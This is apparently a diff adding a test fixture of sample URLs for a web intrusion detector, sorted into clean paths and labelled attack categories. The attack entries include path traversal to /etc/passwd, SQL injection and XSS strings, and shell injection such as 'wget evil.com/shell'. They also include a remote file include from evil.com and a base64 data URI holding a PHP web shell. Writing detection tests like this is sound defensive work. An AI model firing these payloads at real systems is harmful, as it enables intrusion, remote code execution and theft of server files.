@@ -1,0 +1,100 @@
+# Sample URLs for Testing CR Monban Detection
+# Clean URLs (should pass)
+/
+/index.html
+/about
+/contact.php
+/products/item/123
+/api/v1/users
+/images/photo.jpg
+/css/style.css
+/js/app.js
+
+# Reconnaissance (low-medium severity)
+/robots.txt
+/sitemap.xml
+
+# Path Traversal (critical)
+/../../../../etc/passwd
+/cgi-bin/../../../etc/passwd
+/images/..%2f..%2fetc%2fpasswd
+/test.php?file=../../../../etc/passwd
+/download.php?path=..\..\..\..\windows\system32\drivers\etc\hosts
+
+# Web Shells (critical)
+/uploads/c99.php
+/images/shell.php
+/tmp/r57.php
+/files/wso.php
+/cache/alfa.php
+
+# WordPress Attacks (high)
+/wp-admin
+/wp-login.php
+/wp-config.php
+/wp-content/plugins/akismet/
+/xmlrpc.php
+/?author=1
+
+# Joomla Attacks (high)
+/administrator
+/administrator/index.php
+/configuration.php
+/administrator/manifests/files/joomla.xml
+
+# Drupal Attacks (high)
+/user/login
+/admin
+/sites/default/settings.php
+
+# Config Files (critical)
+/.env
+/.git/config
+/config.php
+/database.yml
+/.htaccess
+/phpinfo.php
+
+# Backup Files (critical)
+/backup.sql
+/dump.sql
+/backup.zip
+/site-backup.tar.gz
+
+# Admin Panels (high)
+/admin
+/phpmyadmin
+/cpanel
+/manager/html
+/adminer.php
+
+# SQL Injection (critical)
+/user.php?id=1' or '1'='1
+/product.php?id=1 union select null,null,null
+/search.php?q=admin'--
+/login.php?user=admin' and 1=1--
+
+# XSS Attempts (high)
+/search?q=<script>alert(1)</script>
+/comment.php?text=<img src=x onerror=alert(1)>
+/profile?name=<iframe src=evil.com>
+
+# Shell Injection (critical)
+/ping.php?host=8.8.8.8;cat /etc/passwd
+/exec.php?cmd=ls|wget evil.com/shell
+/system.php?command=$(whoami)
+
+# LFI/RFI (critical)
+/page.php?file=http://evil.com/shell.txt
+/include.php?page=php://filter/convert.base64-encode/resource=config.php
+/template.php?theme=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+
+# Database Admin (critical)
+/phpmyadmin/index.php
+/pma/
+/myadmin/
+/mysql/
+/dbadmin/
+
+# Scanner Signatures (medium - in User-Agent, not URL)
+# These would be detected via User-Agent header
